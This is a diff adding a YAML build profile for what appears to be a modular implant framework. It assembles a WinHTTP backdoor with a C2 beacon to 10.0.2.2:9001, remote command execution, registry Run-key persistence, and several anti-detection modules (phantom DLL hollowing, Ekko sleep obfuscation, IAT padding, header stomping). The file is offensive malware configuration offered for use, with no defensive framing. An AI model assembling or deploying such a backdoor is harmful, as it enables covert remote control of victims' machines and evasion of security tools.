@@ -1,0 +1,30 @@
+name: backdoor_http_phantom
+description: WinHTTP backdoor with phantom DLL hollowing + sleep obfuscation — MEM_IMAGE backed
+
+core:
+  - core/emit_buffer
+  - core/file_ops
+
+c2: c2/winhttp_beacon
+
+commands:
+  - commands/cmd_sysinfo
+  - commands/cmd_processes
+  - commands/cmd_exec
+
+arch: arch/backdoor
+persist: persist/registry_run
+
+resources: true
+
+evasion:
+  - evasion/behavioral_pacing
+  - evasion/phantom_dll
+  - evasion/sleep_ekko
+  - evasion/iat_pad
+  - evasion/header_stomp
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  BEACON_INTERVAL_MS: "10000"
